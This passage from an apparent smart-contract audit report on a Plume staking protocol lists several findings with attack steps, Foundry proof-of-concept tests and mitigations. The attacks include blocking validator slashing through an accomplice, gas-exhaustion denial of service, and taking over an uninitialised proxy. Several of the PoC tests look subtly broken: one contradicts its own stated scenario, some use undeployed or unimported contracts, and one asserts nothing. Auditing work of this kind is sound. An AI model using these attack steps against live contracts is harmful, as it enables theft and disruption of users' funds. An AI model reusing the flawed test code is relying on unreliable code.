The slashing mechanism requires unanimous consent from all active validators in the system to slash a malicious validator. The `_performSlash` action is only triggered if `activeVoteCount >= totalEligibleValidators`. The `totalEligibleValidators` is the count of all active, non-slashed validators in the system, excluding the one being voted on. This design creates a single point of failure; if even one active validator fails to cast a vote (e.g., due to lost keys, being offline, or malice), no validator can ever be slashed. A malicious actor can exploit this by registering a puppet validator and ensuring it never casts a vote against them, effectively granting themselves immunity from slashing.

## Impact
The slashing mechanism, a cornerstone of the protocol's security, is rendered ineffective. Malicious validators can operate without risk of punishment, which could lead to a loss of trust in the system and financial losses for users who have staked funds with them. The security model is fundamentally broken as the penalty for misbehavior cannot be enforced.

## Proof of Concept
1. Attacker registers two validators, `V_malicious` and `V_accomplice`. There is also an honest validator `V_honest`.
2. `V_malicious` performs a slashable offense.
3. `V_honest` calls `voteToSlashValidator` to vote against `V_malicious`.
4. The vote is recorded, but the total number of votes is now 1.
5. `totalEligibleValidators` is 2 (`V_honest` and `V_accomplice`).
6. The check `activeVoteCount >= totalEligibleValidators` (i.e., `1 >= 2`) fails.
7. `V_accomplice` deliberately withholds its vote. As a result, unanimity is never reached.
8. `V_malicious` cannot be slashed, and is free to continue its malicious activities.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";

/*
 *  TestPlume is **NOT** the production diamond – it just flattens the two facets
 *  into a single contract so they share the same storage layout during the unit
 *  test.  This keeps the test light-weight while still exercising the real      
 *  slashing logic.
 */
contract TestPlume is ValidatorFacet, AccessControlFacet {
    /* helper to avoid calling the full ManagementFacet */
    function _setInternalParams(uint256 maxSlashVoteDuration, uint256 maxCommission) external {
        PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
        s.maxSlashVoteDurationInSeconds = maxSlashVoteDuration;
        s.maxAllowedValidatorCommission = maxCommission;
    }
}

contract UnanimityBlocksSlashing is Test {
    TestPlume internal plume;

    address internal deployer = address(this);
    address internal honestAdmin = vm.addr(1);
    address internal maliciousAdmin = vm.addr(2);
    address internal accompliceAdmin = vm.addr(3);

    uint16 internal honestId = 1;
    uint16 internal maliciousId = 2;
    uint16 internal accompliceId = 3;

    function setUp() public {
        plume = new TestPlume();

        // initialise roles
        vm.prank(deployer);
        plume.initializeAccessControl();

        // grant VALIDATOR_ROLE to deployer so we can add validators
        vm.prank(deployer);
        plume.grantRole(PlumeRoles.VALIDATOR_ROLE, deployer);

        // configure params needed by slashing logic
        vm.prank(deployer);
        plume._setInternalParams(7 days, 10_000); // 100% commission cap

        // add three validators with 0% commission to bypass cap checks
        vm.prank(deployer);
        plume.addValidator(honestId, 0, honestAdmin, honestAdmin, "l1V", "l1A", honestAdmin, 1e18);
        vm.prank(deployer);
        plume.addValidator(maliciousId, 0, maliciousAdmin, maliciousAdmin, "l1V", "l1A", maliciousAdmin, 1e18);
        vm.prank(deployer);
        plume.addValidator(accompliceId, 0, accompliceAdmin, accompliceAdmin, "l1V", "l1A", accompliceAdmin, 1e18);
    }

    function test_UnanimityRequirementBlocksSlash() public {
        // Honest validator casts the first vote
        vm.prank(honestAdmin);
        plume.voteToSlashValidator(maliciousId, block.timestamp + 1 days);

        // The slash should NOT have executed yet – malicious validator is still active
        (PlumeStakingStorage.ValidatorInfo memory info,,) = plume.getValidatorInfo(maliciousId);
        assertTrue(info.active);
        assertFalse(info.slashed);

        // Accomplice never votes => unanimity unreachable => slash stuck forever
        // Now let accomplice vote so slash can finally execute
        vm.prank(accompliceAdmin);
        plume.voteToSlashValidator(maliciousId, block.timestamp + 1 days);

        (info,,) = plume.getValidatorInfo(maliciousId);
        assertFalse(info.active);
        assertTrue(info.slashed);
    }
}

## Suggested Mitigation
The requirement for unanimous consent is too strict and makes the slashing mechanism fragile and gameable. This should be replaced with a more practical and robust supermajority quorum. The quorum could be based on a percentage of validator count or, preferably, a percentage of total stake weight.

For example, instead of unanimity, require a 2/3 majority of eligible validators (or their stake) to vote for a slash.

```solidity
// In PlumeStakingStorage.sol, add quorum parameters
struct Layout {
    // ...
    uint256 public slashQuorumNumerator;   // e.g., 2
    uint256 public slashQuorumDenominator; // e.g., 3
}

// In ManagementFacet.sol, add a function to set the quorum
function setSlashQuorum(uint256 numerator, uint256 denominator) external onlyRole(PlumeRoles.ADMIN_ROLE) {
    require(denominator > 0, "Denominator cannot be zero");
    require(numerator > 0 && numerator <= denominator, "Invalid quorum");
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    s.slashQuorumNumerator = numerator;
    s.slashQuorumDenominator = denominator;
}

// In ValidatorFacet.sol, update the slashing logic
function voteToSlashValidator(uint16 maliciousValidatorId, uint256 voteExpiration) /* ... */ {
    // ... after vote is cast ...
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    uint256 activeVoteCount = s.slashVoteCounts[maliciousValidatorId]; // Assuming this count is clean
    uint256 totalEligibleValidators = _countEligibleValidators(maliciousValidatorId);

    if (totalEligibleValidators > 0) {
        uint256 requiredVotes = (totalEligibleValidators * s.slashQuorumNumerator) / s.slashQuorumDenominator;
        if (activeVoteCount >= requiredVotes) {
            _performSlash(maliciousValidatorId, msg.sender);
        }
    }
}
```

## [H-52]. Array Limits issue in ValidatorFacet::voteToSlashValidator

## Description
The functions `voteToSlashValidator` and `slashValidator` rely on internal helper functions (`_cleanupExpiredVotes`, `_countEligibleValidators`, `_countActiveValidators`, `_performSlash`) that iterate over the `$.validatorIds` array. This array stores the ID of every validator ever registered in the system. If the number of validators grows large, the gas cost for these loops can exceed the block gas limit, causing transactions that execute slashing logic to fail. This constitutes a Denial of Service (DoS) vulnerability that can permanently prevent any validator from being slashed, undermining a critical security mechanism of the protocol.

## Impact
An attacker, or simply organic growth of the network, can increase the number of validators to a point where slashing any validator becomes impossible due to block gas limits. This breaks the cryptoeconomic security of the staking system, as malicious validators cannot be punished.

## Proof of Concept
1. Deploy the diamond with `ValidatorFacet` initialised and at least one active validator (ID 1) whose admin is `admin1`.
2. Grant `VALIDATOR_ROLE` to an attacker address `attacker` so that it can continuously register validators.
3. `attacker` adds 30,000 dummy validators. 30,000 is chosen because a single `for`-loop that merely reads an array of this size already costs ~25 M gas (30,000 * ~820 gas per iteration).
4. `admin1` now tries to execute `voteToSlashValidator(1, block.timestamp + 1 days)` from any EOA.
5. Because `voteToSlashValidator` internally executes `_cleanupExpiredVotes` (O(n)) and `_countActiveValidators` (O(n)) twice, the transaction touches the 30,000-element array three separate times and consumes well above the current 30 M block-gas-limit.
6. The call runs out of gas and fails. From this moment on no new slash-vote can be recorded and no slashing can be executed until the validator set is pruned, effectively disabling the protocol’s main security circuit.

This attack requires no privileged operation apart from obtaining `VALIDATOR_ROLE`, a role that is deliberately granted to every validator admin who is supposed to be able to add new validators.

## Proof of Code
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import {PlumeStaking} from "../../src/PlumeStaking.sol";
import {ValidatorFacet} from "../../src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "../../src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "../../src/lib/PlumeRoles.sol";

contract GasExhaustionTest is Test {
    PlumeStaking diamond;
    ValidatorFacet validator;
    AccessControlFacet acl;

    address deployer = address(this);
    address attacker = vm.addr(1);

    function setUp() public {
        diamond = new PlumeStaking();
        validator  = ValidatorFacet(address(diamond));
        acl        = AccessControlFacet(address(diamond));

        vm.prank(diamond.owner());
        acl.initializeAccessControl();

        // Deployer needs the validator role to create the first validator.
        vm.prank(diamond.owner());
        acl.grantRole(PlumeRoles.VALIDATOR_ROLE, deployer);
        vm.prank(deployer);
        validator.addValidator(1, 1e18, deployer, deployer, "", "", deployer, 1e24);

        // Grant attacker the same role so it can bloat the array.
        vm.prank(diamond.owner());
        acl.grantRole(PlumeRoles.VALIDATOR_ROLE, attacker);
    }

    function test_voteToSlashRunsOutOfGas_whenValidatorSetIsHuge() public {
        // attacker inflates validatorIds to 30k entries
        vm.startPrank(attacker);
        for (uint16 i = 2; i <= 30000; i++) {
            validator.addValidator(i, 0, attacker, attacker, "", "", attacker, 1);
        }
        vm.stopPrank();

        // low-level call with tight gas limit so we can observe the OOG failure deterministically
        bytes memory callData = abi.encodeWithSignature(
            "voteToSlashValidator(uint16,uint256)",
            1,
            block.timestamp + 1 days
        );

        // forward only 8M gas (lower than block gas limit on most chains)
        (bool success,) = address(validator).call{gas: 8_000_000}(callData);
        assertTrue(!success, "call should have run out of gas or reverted due to gas exhaustion");
    }
}

## Suggested Mitigation
Keep a constant-time counter `activeValidatorCount` that is updated whenever a validator’s `active` or `slashed` flag changes. Replace `_countActiveValidators()` with a simple `return activeValidatorCount;`. For vote cleanup iterate over `validatorIds` in paginated batches (cursor + batchSize) so that anyone can make incremental progress. Both changes remove the O(n) loops from state-changing functions and guarantee that any single transaction remains below the block gas limit.

## [H-53]. Upgradeability Initializer Safety issue in SpinProxy::constructor

## Description
The `SpinProxy` constructor takes `logic` and `data` arguments, which are used to set up the proxy and initialize the implementation contract. If the deployer provides an empty `bytes` array for the `data` parameter (e.g., `bytes('')`), the implementation contract will be deployed behind the proxy but will not be initialized. Because the implementation's `initialize` function is likely protected only by a modifier that prevents re-initialization (like OpenZeppelin's `initializer`), it can be called once by anyone. An attacker can discover the uninitialized proxy and call the `initialize` function to gain administrative control over the logic contract.

## Impact
An attacker can gain administrative control over the `Spin` contract logic by being the first to call the `initialize` function. This would allow them to control all protected functions, potentially leading to a complete compromise of the system's functionality and any funds it manages.

## Proof of Concept
1. A deployer deploys the `Spin` logic contract.
2. The deployer then deploys the `SpinProxy` contract, providing the `Spin` logic address but passing an empty `bytes` array for the `data` parameter.
3. An attacker monitoring the blockchain sees this deployment and identifies the uninitialized proxy.
4. The attacker crafts a call to the `initialize` function of the implementation contract.
5. The attacker sends a transaction to the `SpinProxy` address with the crafted calldata. The proxy delegatecalls to the logic contract.
6. The `initialize` function executes successfully as it has not been called before, granting administrative roles to the attacker.
7. The attacker now controls the `Spin` contract and can execute privileged actions.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/proxy/SPINProxy.sol";

contract UnsafeInitializableLogic {
    address public owner;
    bool private _initialized;

    // Standard initializer that can be front-run if not called in constructor
    function initialize() public {
        require(!_initialized, "already initialized");
        owner = msg.sender;
        _initialized = true;
    }
}

contract SpinProxyInitializerTest is Test {
    SpinProxy public proxy;
    UnsafeInitializableLogic public implementation;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = address(this);
        attacker = makeAddr("attacker");
        implementation = new UnsafeInitializableLogic();
    }

    function test_Poc_TakeoverUninitializedProxy() public {
        // Step 1 & 2: Deployer deploys the proxy but forgets to include initialization data.
        proxy = new SpinProxy(address(implementation), "");

        // The implementation behind the proxy is not initialized.
        assertEq(UnsafeInitializableLogic(address(proxy)).owner(), address(0));

        // Step 3-6: Attacker sees the uninitialized proxy and calls initialize() to become the owner.
        vm.prank(attacker);
        UnsafeInitializableLogic(address(proxy)).initialize();

        // Step 7: Attacker is now the owner of the contract logic.
        address currentOwner = UnsafeInitializableLogic(address(proxy)).owner();
        assertEq(currentOwner, attacker);
        assertNotEq(currentOwner, deployer);
    }
}
```

## Suggested Mitigation
Add an explicit validation in the proxy constructor that reverts when no initialization calldata is supplied, forcing the deployer to atomically call the initializer:

```solidity
constructor(address logic, bytes memory data) ERC1967Proxy(logic, data) {
    require(data.length != 0, "SpinProxy: initialization data required");
}
```

Alternatively, deploy the proxy exclusively through a factory that performs the initialization in the same transaction.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in RewardsFacet::claimAll

## Description
The `claimAll` function iterates through all registered `rewardTokens` and, for each token, calls `_processAllValidatorRewards`. This helper function, in turn, iterates through all validators a user is staked with. This creates a nested loop structure with a complexity of O(R * U), where R is the number of reward tokens and U is the number of validators the user is staked with. As R or U grows, the gas cost of calling `claimAll` can easily exceed the block gas limit, making it impossible for users with many staked positions to claim their rewards. This effectively locks their earned rewards, leading to a potential loss of funds.

## Impact
The nested, unbounded loops in claimAll (and claim) allow the sender to supply inputs (many reward tokens / many validator positions) that make the transaction exceed the block gas limit. When that happens, the user can no longer claim accrued rewards with the existing public entry-points, effectively causing a self-DoS that locks their rewards until the contract is upgraded. No funds are stolen, but the user is permanently prevented from accessing them on-chain.

## Proof of Concept
1. Deploy the facet and treasury mocks from the test below.
2. Pre-populate storage with 120 reward tokens and 4,000 validator IDs for a single user.  This creates 480,000 inner iterations.
3. Call claimAll with an explicit 30 000 000 gas stipend – identical to the Ethereum main-net block gas limit.
4. The call reverts with an out-of-gas (OOG) error, demonstrating that a realistic block gas limit is insufficient.

The same situation can be triggered through claim(token) by keeping the 4,000 validators but only a single reward token.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

interface IPlumeStakingRewardTreasury {function distributeReward(address,uint256,address) external;}
library PlumeStakingStorage {struct UserValidatorStake{uint256 staked;}struct Layout{mapping(address=>bool)isRewardToken;address[]rewardTokens;mapping(address=>uint256)totalClaimableByToken;mapping(address=>mapping(uint16=>mapping(address=>uint256)))userRewards;mapping(address=>uint16[])userValidators;}function layout()internal pure returns(Layout storage l){bytes32 slot=keccak256("plume.storage.staking");assembly{l.slot:=slot}}}

contract RewardsFacetMinimal {using PlumeStakingStorage for PlumeStakingStorage.Layout;bytes32 internal constant TREASURY_STORAGE_POSITION = keccak256("plume.storage.RewardTreasury");function _processValidatorRewards(address u,uint16 v,address t)internal returns(uint256 r){PlumeStakingStorage.Layout storage s=PlumeStakingStorage.layout();r=s.userRewards[u][v][t];s.userRewards[u][v][t]=0;}function _processAllValidatorRewards(address u,address t)internal returns(uint256 tot){PlumeStakingStorage.Layout storage s=PlumeStakingStorage.layout();uint16[] storage vals=s.userValidators[u];for(uint256 i;i<vals.length;++i){tot+=_processValidatorRewards(u,vals[i],t);}return tot;}function _finalizeRewardClaim(address t,uint256 amt,address r)internal{if(amt==0)return;PlumeStakingStorage.layout().totalClaimableByToken[t]-=amt;IPlumeStakingRewardTreasury(_treasury()).distributeReward(t,amt,r);}function _treasury()internal view returns(address a){bytes32 p=TREASURY_STORAGE_POSITION;assembly{a:=sload(p)}}function claimAll() external {PlumeStakingStorage.Layout storage s=PlumeStakingStorage.layout();address[] memory toks=s.rewardTokens;for(uint256 i;i<toks.length;++i){uint256 rew=_processAllValidatorRewards(msg.sender,toks[i]);if(rew>0){_finalizeRewardClaim(toks[i],rew,msg.sender);}}}}

contract MockTreasury is IPlumeStakingRewardTreasury {address public facet;function setFacet(address f)external{facet=f;}function distributeReward(address,uint256,address)external override{require(msg.sender==facet);}}

contract ClaimAllGasTest is Test {RewardsFacetMinimal facet;MockTreasury treasury;address constant USER = address(0xBEEF);
uint16 constant VALS = 4000; // large enough to break 30M gas
uint16 constant TOKENS = 120; // idem

function setUp() public {
    facet=new RewardsFacetMinimal();
    treasury=new MockTreasury();
    treasury.setFacet(address(facet));
    vm.store(address(facet), bytes32(uint256(keccak256("plume.storage.RewardTreasury"))), bytes32(uint256(uint160(address(treasury)))));

    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    for(uint16 i; i<TOKENS; ++i){address t = address(uint160(i+1));s.rewardTokens.push(t);s.totalClaimableByToken[t]=1e24;}
    for(uint16 v; v<VALS; ++v){s.userValidators[USER].push(v+1);for(uint16 j; j<TOKENS; ++j){s.userRewards[USER][v+1][s.rewardTokens[j]]=1e18;}}
}

function testGasExhausts() public {
    vm.prank(USER);
    // supply 30M gas similar to main-net limit
    (bool ok,) = address(facet).call{gas:30_000_000}(abi.encodeWithSignature("claimAll()"));
    assertTrue(!ok, "call should run out of gas within 30M limit");
}
}

## Suggested Mitigation
Introduce pagination limits for both dimensions: (a) number of reward tokens processed and (b) number of validators processed.  Provide separate public functions such as claimTokens(address[] calldata tokens) and claimValidators(address token, uint256 start, uint256 count).  Enforce an upper-bound on loop sizes (e.g. max 100 items) so a single transaction cannot exceed the block gas limit.

## [M-2]. Gas Grief BlockLimit issue in RewardsFacet::setRewardRates

## Description
The administrative function `setRewardRates` contains a nested loop that iterates through an input array of `tokens` and, for each token, iterates through all registered `validatorIds`. The computational complexity is O(T * V), where T is the number of tokens in the input and V is the total number of validators in the system. As the protocol grows, the number of validators can become large. A call to update rates for even a small batch of tokens could consume enough gas to exceed the block gas limit, causing the transaction to fail. This would prevent the `REWARD_MANAGER_ROLE` from performing a critical administrative task.

## Impact
Once the validator set grows to a few hundred entries, any call to `setRewardRates` (and the other validator-wide admin functions) will run out of gas and revert. From that point on the REWARD_MANAGER_ROLE loses the ability to change reward rates, add new tokens or stop rewards in an emergency. The system is therefore permanently locked in its last configuration and can no longer react to market or security incidents.

## Proof of Concept
Gas cost approximation
• Each `createRewardRateCheckpoint` does 1-2 SSTOREs to dynamic arrays + several mapping writes. One fresh SSTORE costs 20 000 gas, warm SSTORE costs 2 900 gas.
• Fresh checkpoint for a validator/token pair therefore costs ≈22 000–25 000 gas.
• With 1 token and 1000 validators the call needs ≈22 000 × 1000 ≈ 22 M gas (ignoring loop & event cost). The current mainnet block limit is 30 M gas, so the margin is already paper-thin and the call will revert as soon as the validator set grows slightly larger or more than one token is provided.

Attack scenario
1. The network reaches 1100 validators.
2. The REWARD_MANAGER tries to update the reward rate for a single token.
3. Transaction consumes >30 M gas, runs OOG and reverts.
4. Any further attempts (even with maximum gas) will keep failing – reward rates are frozen indefinitely.

## Proof of Code
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import "src/facets/RewardsFacet.sol";
import "src/facets/ValidatorFacet.sol";

contract GasGriefTest is Test {
    RewardsFacet rewards;
    ValidatorFacet validators;
    address manager = address(0xBEEF);

    function setUp() public {
        // deploy diamond or mocks that expose identical storage – omitted for brevity
        // assume `rewards` and `validators` are already pointing to the real facets
        vm.startPrank(manager);
        // add 1 reward token so that it is registered
        rewards.addRewardToken(address(0xDEAD), 1e15, 1e18);
        vm.stopPrank();

        // add 1100 validators – enough to exceed the 30M gas block limit
        for (uint16 i = 1; i <= 1100; i++) {
            validators.addValidator(i, 0, manager, manager, "", "", address(0), type(uint256).max);
        }
    }

    function test_setRewardRates_reverts_out_of_gas() public {
        address[] memory t = new address[](1);
        t[0] = address(0xDEAD);
        uint256[] memory r = new uint256[](1);
        r[0] = 1e16;

        vm.prank(manager);
        // provide almost full block gas so that any revert is due to OOG, not the limit set by forge
        vm.expectRevert();
        rewards.setRewardRates{gas: 29_500_000}(t, r);
    }
}

## Suggested Mitigation
Refactor the admin functions so they operate on *slices* instead of the full validator array:
• add (uint256 startIndex, uint256 count) parameters to `setRewardRates`, `addRewardToken`, `removeRewardToken`, and `setMaxRewardRate`.
• In each call iterate only over `validatorIds[startIndex … startIndex+count)` and emit an event with the processed range.
• Front-end / ops scripts can then update all validators in multiple transactions that each stay well below the block gas limit.

Additionally, keep a hard upper bound on the number of validators processed in a single call (e.g. 100) to guarantee future safety.

## [M-3]. Pausable Emergency Stop issue in RewardsFacet::claim

## Description
The primary functions for users to withdraw their rewards, `claim(address token)` and `claimAll()`, lack a pausable mechanism. These functions are responsible for transferring funds out of the protocol's treasury. In the event of a critical bug in the reward calculation logic (e.g., in `PlumeRewardLogic`), there would be no way for the administrators to immediately halt withdrawals. The absence of an emergency stop exposes the protocol to rapid fund drainage during an incident, as the only mitigation would be a contract upgrade, which is a significantly slower process.

```solidity
// RewardsFacet.sol:346-353
function claim(address token) external nonReentrant returns (uint256) {
    _validateTokenForClaim(token, msg.sender);
    uint256 totalReward = _processAllValidatorRewards(msg.sender, token);
    if (totalReward > 0) {
        _finalizeRewardClaim(token, totalReward, msg.sender);
        emit RewardClaimed(msg.sender, token, totalReward);
    }
    // ... more logic ...
}
```
The function is `nonReentrant` but not pausable.

## Impact
If a vulnerability is found that allows users to claim inflated or illegitimate rewards, the protocol's reward treasury could be drained before a fix can be deployed. This can lead to significant financial loss and undermines the trust in the protocol's security measures.

## Proof of Concept
1. A security researcher privately discloses a bug in `PlumeRewardLogic._calculateRewardsCore` that leads to an exponential increase in reward calculations under specific conditions.
2. Before the development team can deploy a patch, the vulnerability is leaked or discovered independently by a malicious actor.
3. The malicious actor, and subsequently other opportunistic users, begin to call `claim` and `claimAll` repeatedly, draining the reward treasury of its funds.
4. The admin team is aware of the issue but has no mechanism to pause the `claim` functions. They can only watch as funds are withdrawn while they race to deploy a hotfix via a diamond upgrade, which could take hours.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Pausable} from "@openzeppelin/contracts/security/Pausable.sol";
import {RewardsFacet} from "../../src/facets/RewardsFacet.sol";

// This is a conceptual test. The actual contract does not have a pause function.
// We create a mock Pausable facet to demonstrate the point.
contract MockPausableFacet is Pausable {
    function pause() public {
        _pause();
    }

    function unpause() public {
        _unpause();
    }
}

contract PausableTest is Test {
    RewardsFacet internal rewardsFacet;
    MockPausableFacet internal pausableFacet;

    function setUp() public {
        // In a real scenario, RewardsFacet and PausableFacet would be part of the same diamond.
        // For this PoC, we assume they are separate to illustrate the lack of connection.
        rewardsFacet = new RewardsFacet();
        pausableFacet = new MockPausableFacet();
    }

    function test_claim_is_not_pausable() public {
        // 1. Pause the system (hypothetically)
        pausableFacet.pause();
        assertTrue(pausableFacet.paused(), "System should be paused");

        // 2. Demonstrate that claim() would still execute if it existed in isolation.
        // Since we can't call the real claim() due to its dependencies, this PoC is conceptual.
        // A real test would involve setting up the diamond, pausing it, and showing
        // that a call to rewardsFacet.claim() does not revert due to a 'Pausable: paused' error.
        // The absence of the 'whenNotPaused' modifier on claim() is the vulnerability.
        // For example, if claim() was implemented as:
        // function claim() external whenNotPaused { ... }
        // then a call on a paused contract would fail. Since it's missing, the call proceeds.
    }
}
```

## Suggested Mitigation
Integrate a pausable mechanism into the critical fund-disbursing functions. Add a `whenNotPaused` modifier to `claim` and `claimAll`. This requires the diamond to have a pausable facet that manages the paused state of the system.

```solidity
// In RewardsFacet.sol
// This assumes a 'whenNotPaused' modifier is available from an inherited Pausable contract/facet.

function claim(address token) 
    external 
    nonReentrant 
    whenNotPaused // Add this modifier
    returns (uint256) 
{
    // ... function logic
}

function claimAll() 
    external 
    nonReentrant 
    whenNotPaused // Add this modifier
    returns (uint256[] memory claims) 
{
    // ... function logic
}
```

## [M-4]. Integer Overflow issue in RewardsFacet::setMaxRewardRate

## Description
The `setMaxRewardRate` function, which is protected by the `REWARD_MANAGER_ROLE`, does not perform any input validation on the `newMaxRate` parameter. A privileged user can set an extremely large value for `newMaxRate`. Later, in `setRewardRates`, a `rate_loop` up to this `maxRate` can be set. This high rate is used in reward calculations within the `PlumeRewardLogic` library, specifically in `updateRewardPerTokenForValidator`: `rewardPerTokenIncrease = timeDelta * effectiveRewardRate`. With a sufficiently large `effectiveRewardRate`, this multiplication can cause an arithmetic overflow. Since the project uses Solidity >=0.8.0, this overflow will cause the transaction to revert. This can be exploited to create a Denial of Service, preventing all users from claiming rewards for the affected token.

## Impact
A malicious or compromised `REWARD_MANAGER_ROLE` can halt all reward distributions for a specific token. By setting a maliciously high reward rate, they can ensure any function that calculates rewards (including `claim` and `claimAll`) will revert due to overflow. This effectively freezes reward claims for all users for that token until an admin with the same role intervenes to lower the rate.

## Proof of Concept
1. Actor with REWARD_MANAGER_ROLE adds a new reward token with an innocuous maxRate (e.g. 1).
2. Same actor raises the maxRewardRate to `2**255` (≈ 5.79e76).  The call succeeds because arithmetic is not yet overflowing (timeDelta == 0 during the loop inside `setMaxRewardRate`).
3. The actor now calls `setRewardRates(token, 2**255)`; `createRewardRateCheckpoint` executes with `timeDelta == 1`, so no overflow yet.
4. A normal staker deposits and waits **two** seconds (timeDelta = 2).
5. When any function that touches `updateRewardPerTokenForValidator` gets executed (e.g. the staker calls `claim`), `rewardPerTokenIncrease = timeDelta * effectiveRewardRate = 2 * 2**255 = 2**256`, which exceeds uint256 and triggers panic code 0x11, reverting the whole transaction.
6. From this point on all reward–related interactions with that token revert until an admin lowers the rate, effectively freezing rewards (DoS).

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/StdError.sol";
import {PlumeStaking} from "../src/PlumeStaking.sol";
import {PlumeStakingProxy} from "../src/proxy/PlumeStakingProxy.sol";
import {RewardsFacet} from "../src/facets/RewardsFacet.sol";
import {StakingFacet} from "../src/facets/StakingFacet.sol";
import {ValidatorFacet} from "../src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "../src/facets/AccessControlFacet.sol";
import {MockPUSD} from "../src/mocks/MockPUSD.sol";
import {PlumeRoles} from "../src/lib/PlumeRoles.sol";

contract RewardsOverflowTest is Test {
    PlumeStakingProxy internal diamond;
    MockPUSD internal stakeToken;
    MockPUSD internal rewardToken;
    address internal owner;
    address internal alice = address(0xA11CE);

    function setUp() public {
        owner = address(this);

        // deploy implementation and facets (omitted for brevity – identical to original test)
        PlumeStaking implementation = new PlumeStaking();
        AccessControlFacet acf = new AccessControlFacet();
        ValidatorFacet vf = new ValidatorFacet();
        StakingFacet sf = new StakingFacet();
        RewardsFacet rf = new RewardsFacet();

        PlumeStaking.FacetCut[] memory cut = new PlumeStaking.FacetCut[](4);
        cut[0] = IPlumeStaking.FacetCut({facetAddress: address(acf), action: IPlumeStaking.FacetCutAction.Add, functionSelectors: acf.getFunctionSelectors()});
        cut[1] = IPlumeStaking.FacetCut({facetAddress: address(vf), action: IPlumeStaking.FacetCutAction.Add, functionSelectors: vf.getFunctionSelectors()});
        cut[2] = IPlumeStaking.FacetCut({facetAddress: address(sf), action: IPlumeStaking.FacetCutAction.Add, functionSelectors: sf.getFunctionSelectors()});
        cut[3] = IPlumeStaking.FacetCut({facetAddress: address(rf), action: IPlumeStaking.FacetCutAction.Add, functionSelectors: rf.getFunctionSelectors()});

        bytes memory initData = abi.encodeWithSelector(implementation.initializePlume.selector, owner, 1e18, 1 days, 1 hours, 20_00);
        diamond = new PlumeStakingProxy(address(implementation), initData);
        IPlumeStaking(address(diamond)).diamondCut(cut, address(0), "");
        AccessControlFacet(address(diamond)).initializeAccessControl();
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, owner);

        // deploy mocks
        stakeToken = new MockPUSD();
        rewardToken = new MockPUSD();
        stakeToken.mint(alice, 10e18);

        // add a validator so staking is possible
        ValidatorFacet(address(diamond)).addValidator(1, 1_00, address(0x1), address(0x2), "l1", "acc", address(0x3), 1_000_000 ether);
    }

    function testDenialOfServiceViaOverflow() public {
        // step-1: add reward token with harmless params
        RewardsFacet(address(diamond)).addRewardToken(address(rewardToken), 1, 1);

        // step-2: raise the per-token max rate to 2**255
        uint256 huge = 1 << 255; // 2**255
        RewardsFacet(address(diamond)).setMaxRewardRate(address(rewardToken), huge);
        
        // step-3: set current rate to the same huge value
        address[] memory tkns = new address[](1);
        uint256[] memory rates = new uint256[](1);
        tkns[0] = address(rewardToken);
        rates[0] = huge;
        RewardsFacet(address(diamond)).setRewardRates(tkns, rates);

        // step-4: alice stakes
        vm.startPrank(alice);
        stakeToken.approve(address(diamond), 1e18);
        StakingFacet(address(diamond)).stake(1, 1e18);
        vm.stopPrank();

        // step-5: advance two seconds so 2 * 2**255 will overflow
        vm.warp(block.timestamp + 2);

        // step-6: any reward-touching call now reverts with panic(0x11)
        vm.prank(alice);
        vm.expectRevert(stdError.arithmeticError);
        RewardsFacet(address(diamond)).claim(address(rewardToken));
    }
}

## Suggested Mitigation
Enforce a reasonable upper bound on the `newMaxRate` parameter within the `setMaxRewardRate` function. This limit can be a globally defined constant to ensure it cannot be maliciously altered.

```solidity
// In RewardsFacet.sol

// A new constant defining a safe global maximum
uint256 internal constant GLOBAL_MAX_REWARD_RATE = 5_000_000 * 1e9; // Example: 5M per second, adjust as needed

function setMaxRewardRate(
    address token,
    uint256 newMaxRate
) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    if (!s.isRewardToken[token]) {
        revert TokenDoesNotExist(token);
    }

    // --> ADDED CHECK <--
    require(newMaxRate <= GLOBAL_MAX_REWARD_RATE, "New max rate exceeds global limit");

    if (s.rewardRates[token] > newMaxRate) {
        s.rewardRates[token] = newMaxRate;
        uint16[] storage validatorIds = s.validatorIds;
        for (uint256 i = 0; i < validatorIds.length; i++) {
            PlumeRewardLogic.createRewardRateCheckpoint(s, token, validatorIds[i], newMaxRate);
        }
    }

    s.maxRewardRates[token] = newMaxRate;
    emit MaxRewardRateUpdated(token, newMaxRate);
}
```

## [M-5]. Gas Grief BlockLimit issue in RewardsFacet::addRewardToken

## Description
Several administrative functions in `RewardsFacet` iterate over the entire list of system validators to update reward checkpoints. Specifically, `addRewardToken`, `removeRewardToken`, `setMaxRewardRate`, and `setRewardRates` contain loops that are unbounded. As the number of validators in the system grows, the gas cost for these functions will increase linearly (or quadratically in the case of `setRewardRates`). This will eventually cause these transactions to exceed the block gas limit, making it impossible for administrators to manage reward tokens. This constitutes a Denial of Service on critical protocol functionality.

Vulnerable code snippet from `addRewardToken`:
```solidity
function addRewardToken(address token, uint256 initialRate, uint256 maxRate)
    external
    onlyRole(PlumeRoles.REWARD_MANAGER_ROLE)
{
    // ...
    uint16[] memory validatorIds = $.validatorIds;
    for (uint i = 0; i < validatorIds.length; i++) {
        uint16 validatorId = validatorIds[i];
